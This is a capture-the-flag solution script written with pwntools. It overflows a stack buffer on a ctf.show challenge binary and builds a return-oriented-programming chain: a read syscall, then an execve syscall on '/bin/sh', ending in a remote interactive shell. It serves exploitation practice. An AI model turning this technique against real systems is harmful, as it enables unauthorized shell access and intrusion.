from pwn import *
context.log_level = 'debug'
#io = process("./pwn")
io = remote('pwn.challenge.ctf.show',28166)
pop_rax = 0x46b9f8
pop_rdi = 0x4016c3
pop_rdx_rsi = 0x4377f9
bss = 0x6c2000
ret = 0x45bac5
payload  = cyclic(0x50+8)
payload += p64(pop_rax)+p64(0x0)
payload += p64(pop_rdx_rsi)+p64(0x10)+p64(bss)
payload += p64(pop_rdi)+p64(0)
payload += p64(ret)
payload += p64(pop_rax)+p64(0x3b)
payload += p64(pop_rdx_rsi)+p64(0)+p64(0)
payload += p64(pop_rdi)+p64(bss)
payload += p64(ret)
io.sendline(payload)
io.sendline("/bin/sh\x00")
io.interactive()
